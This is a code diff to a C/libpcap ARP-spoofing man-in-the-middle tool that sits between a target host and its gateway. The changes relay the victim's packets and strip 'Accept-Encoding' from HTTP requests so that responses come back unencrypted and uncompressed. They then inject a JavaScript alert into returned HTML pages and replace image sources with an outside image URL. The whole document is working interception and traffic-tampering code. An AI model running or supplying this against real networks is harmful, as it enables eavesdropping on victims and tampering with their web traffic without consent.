@@ -31,7 +31,7 @@ void *startG(void *arg) {
     struct arg1 *real_arg = (struct arg1 *)arg;
     while (1) {
         send_packet(real_arg->handle, real_arg->packet, real_arg->size);
-        sleep(10);
+        sleep(8);
     }
     pthread_exit(NULL);
 }
@@ -41,7 +41,7 @@ void *startV(void *arg) {
     struct arg1 *real_arg = (struct arg1 *)arg;
     while (1) {
         send_packet(real_arg->handle, real_arg->packet, real_arg->size);
-        sleep(10);
+        sleep(8);
     }
     pthread_exit(NULL);
 }
@@ -51,29 +51,33 @@ void *startF(void *arg) {
 
     /* receive parameter */
     struct arg2 *real_arg =(struct arg2 *)arg;
-    u_char *packet = (u_char *)malloc(real_arg->size * sizeof(char));
-    memcpy(packet, real_arg->packet, real_arg->size);
-    ethernet_header *pEther = (ethernet_header *)packet;
+    ethernet_header *pEther = (ethernet_header *)real_arg->packet;
     ip_header *pIpv4 = (ip_header *)pEther->data;
     tcp_header *pTcp = (tcp_header *)pIpv4->data;
 
     /* forward packet straightly */
     if (!strncmp(pEther->SRC_mac, TARGET_MAC, 6) && !strncmp(pEther->DST_mac, ATTACKER_MAC, 6)) {
         memcpy(pEther->DST_mac, GATEWAY_MAC, 6);
-        send_packet(real_arg->handle, packet, real_arg->size);
+        if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->protocol_type == PROTOCOL_TCP)
+            str_replace((char *)pTcp->data, "Accept-Encoding", "Accept-Nothing!");
+        for (int i = 0; i < 10; i++)
+            send_packet(real_arg->handle, real_arg->packet, real_arg->size);
     }
 
     /* modify html */
-    else if (!strncmp(pEther->SRC_mac, GATEWAY_MAC, 6) && !strncmp(pIpv4->dest_ip, TARGET_IP, 4)) {
+    else if (!strncmp(pEther->SRC_mac, GATEWAY_MAC, 6) && !strncmp(pEther->DST_mac, ATTACKER_MAC, 6) && !strncmp(pIpv4->dest_ip, TARGET_IP, 4)) {
         memcpy(pEther->DST_mac, TARGET_MAC, 6);
         if (choose == 2)
-            if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->type_of_service == PROTOCOL_TCP)
-                str_replace((char *)pTcp->data, "<head>", "<head><script type=\"text/javascript\">alert('big brother is watching at you');</script>");
+            if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->protocol_type == PROTOCOL_TCP) {
+                str_replace((char *)pTcp->data, "<head>", "<head><script type=\"text/javascript\">alert('Big brother is watching at you');</script>");
+            }
         if (choose == 3)
-            if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->type_of_service == PROTOCOL_TCP)
+            if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->protocol_type == PROTOCOL_TCP)
                 str_replace((char *)pTcp->data, "img src=", "img src=\"https://raw.githubusercontent.com/zxc479773533/HUA-JI-YOU/master/HUAJI.jpg\"");
-        send_packet(real_arg->handle, packet, real_arg->size);
+        for (int i = 0; i < 10; i++)
+            send_packet(real_arg->handle, real_arg->packet, real_arg->size);
     }
+    pthread_exit(NULL);    
 }
 
 /* get gatway's mac */
@@ -113,7 +117,7 @@ int main(int argc, char const *argv[]) {
     addr_net.s_addr = net_addr;
     net = inet_ntoa(addr_net);
     printf("Opening device\n");
-    handle = pcap_open_live(dev, 65536, 1, 0, errbuf);
+    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
     if (!handle) {
         printf("%s\n", errbuf);
         printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
@@ -200,22 +204,17 @@ int main(int argc, char const *argv[]) {
     scanf(" %d", &choose);
 
     /* four modes */
-    char my_mac[20];
-    sprintf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-    ATTACKER_MAC[0], ATTACKER_MAC[1], ATTACKER_MAC[2], ATTACKER_MAC[3], ATTACKER_MAC[4], ATTACKER_MAC[5]);
-    strcpy(filter_app, "not ether src ");
-    strcat(filter_app, my_mac);
+    strcpy(filter_app, "");
     pcap_compile(handle, &filter, filter_app, 0, *net);
     pcap_setfilter(handle, &filter);
     while (1) {
-        if (pcap_next_ex(handle, &pkt_header, &pkt_data) > 0) {
+        if (pcap_next_ex(handle, &pkt_header, (const u_char **)&pkt_data) > 0) {
             pthread_t new_thread;
             forward_arg.handle = handle;
             forward_arg.packet = pkt_data;
             forward_arg.pkthdr = pkt_header;
             forward_arg.size = pkt_header->caplen;
             pthread_create(&new_thread, NULL, (void *)startF, (void *)&forward_arg);
-            while(pkt_data);
         }
     }
 
